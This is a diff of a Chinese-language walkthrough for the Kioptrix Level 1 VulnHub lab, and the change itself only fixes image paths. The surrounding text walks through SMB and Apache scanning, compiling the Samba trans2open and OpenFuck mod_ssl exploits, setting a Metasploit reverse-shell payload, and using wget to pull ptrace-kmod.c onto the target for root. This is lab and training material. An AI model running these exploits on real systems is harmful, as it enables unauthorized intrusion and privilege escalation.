@@ -14,13 +14,13 @@
 
 也可以使用`nmap`等工具进行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\1.jpg)
+![](./pic-1/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\2.jpg)
+![](./pic-1/2.jpg)
 
 对于后续的目录爆破等，因为我个人测试过，所以发现网站的目录无价值，进而直接搜索版本漏洞进行测试
 
@@ -34,7 +34,7 @@
 
 如图，并未把版本揭示，那么我对于漏洞的使用缺失重要的一块
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\3.jpg)
+![](./pic-1/3.jpg)
 
 更换工具，采用`github`上的一个项目进行测试`https://github.com/amitn322/smb-version/blob/master/samba_version.py`
 
@@ -44,15 +44,15 @@
 python2 smbversion.py -s 192.168.1.104
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\4.jpg)
+![](./pic-1/4.jpg)
 
 使用`searchsploit`进行测试，发现对应的漏洞只有一个可用于继续下一步，对于`.rb`，因为是`msf`特有的，所以暂不考虑
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\5.jpg)
+![](./pic-1/5.jpg)
 
 查看`10.c`文件，给出了用法
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\6.jpg)
+![](./pic-1/6.jpg)
 
 那么直接进行编译即可
 
@@ -60,7 +60,7 @@ python2 smbversion.py -s 192.168.1.104
 gcc 10.c -o exp
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\7.jpg)
+![](./pic-1/7.jpg)
 
 编译成功，直接执行上面的用法，针对单个`ip`即可
 
@@ -70,7 +70,7 @@ gcc 10.c -o exp
 
 执行后，提权至`root`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\8.jpg)
+![](./pic-1/8.jpg)
 
 
 
@@ -87,7 +87,7 @@ msfconsole
 search type:auxiliary smb version detection
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\9.jpg)
+![](./pic-1/9.jpg)
 
 那么使用该模块，命令如下
 
@@ -102,11 +102,11 @@ msf6 auxiliary(scanner/smb/smb_version) > options
 msf6 auxiliary(scanner/smb/smb_version) > run
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\10.jpg)
+![](./pic-1/10.jpg)
 
 执行后，会看到对应的版本信息
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\11.jpg)
+![](./pic-1/11.jpg)
 
 通过版本在`msf`中搜索可执行漏洞，这里注意，漏洞都是同一种`trans2open`，只是操作系统不同，这里靶机为`linux`操作系统，所以根据操作系统去选择
 
@@ -114,7 +114,7 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 search type:exploit samba 2.2
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\12.jpg)
+![](./pic-1/12.jpg)
 
 ```shell
 use 2
@@ -131,11 +131,11 @@ set payload linux/x86/shell/reverse_tcp
 //脚本很多，选择其中一个即可
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\13.jpg)
+![](./pic-1/13.jpg)
 
 这时候执行，等待缓冲区溢出的爆破，一会即可发现反弹成功
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\14.jpg)
+![](./pic-1/14.jpg)
 
 
 
@@ -147,7 +147,7 @@ set payload linux/x86/shell/reverse_tcp
 searchsploit mod_ssl 2.8.4
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\15.jpg)
+![](./pic-1/15.jpg)
 
 再使用`nikto`测试，发现也是有提到，可能存在
 
@@ -155,13 +155,13 @@ searchsploit mod_ssl 2.8.4
 nikto -h 192.168.1.104
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\16.jpg)
+![](./pic-1/16.jpg)
 
 测试，直接使用`remote buffer overflow`，这个是我个人习惯，采用最新版本。
 
 查看这个`c`文件，其中有用法，以及条件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\17.jpg)
+![](./pic-1/17.jpg)
 
 那么就执行安装后，然后再编译
 
@@ -176,7 +176,7 @@ gcc -o openfuck 47080.c -lcrypto
 ./openfuck
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\18.jpg)
+![](./pic-1/18.jpg)
 
 大概用法就是
 
@@ -186,7 +186,7 @@ gcc -o openfuck 47080.c -lcrypto
 
 向下翻找，发现与前面`nmap`扫描出的`443`端口的服务版本`redhat`，中间件版本`apache 1.3.20`对应的有两个
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\19.jpg)
+![](./pic-1/19.jpg)
 
 测试这两个即可
 
@@ -198,13 +198,13 @@ gcc -o openfuck 47080.c -lcrypto
 
 这里经过测试两个，发现都是提示超时
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\20.jpg)
+![](./pic-1/20.jpg)
 
 可能这里无法利用，不过查看了网上的`wp`，发现可以利用，这让我陷入深思，所以暂且到这里，等我搞清楚，会发布
 
 这里原因是我顺序搞错了，没仔细看帮助用法
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\22.jpg)
+![](./pic-1/22.jpg)
 
 ```shell
 ./openfuck 0x6a 192.168.1.104  443
@@ -214,7 +214,7 @@ gcc -o openfuck 47080.c -lcrypto
 
 测试，发现第二个`0x6b`可获取，但是获取的并非`root`权限，提示是执行后缺失文件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\23.jpg)
+![](./pic-1/23.jpg)
 
 不过这里缺失的文件，给出了下载链接
 
@@ -224,11 +224,11 @@ gcc -o openfuck 47080.c -lcrypto
 wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\24.jpg)
+![](./pic-1/24.jpg)
 
 因为获取的shell当前目录就是在`/tmp`。所以可以下载，所以直接使用`wget`下载到这里
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\25.jpg)
+![](./pic-1/25.jpg)
 
 这时候再执行该脚本，即可发现成功获取到`root`，不过这里的命令需要在后面加上`-c`
 
@@ -236,7 +236,7 @@ wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
 ./openfuck 0x6b 192.168.1.104 443 -c 40
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-1\26.jpg)
+![](./pic-1/26.jpg)
 
 # 总结
 
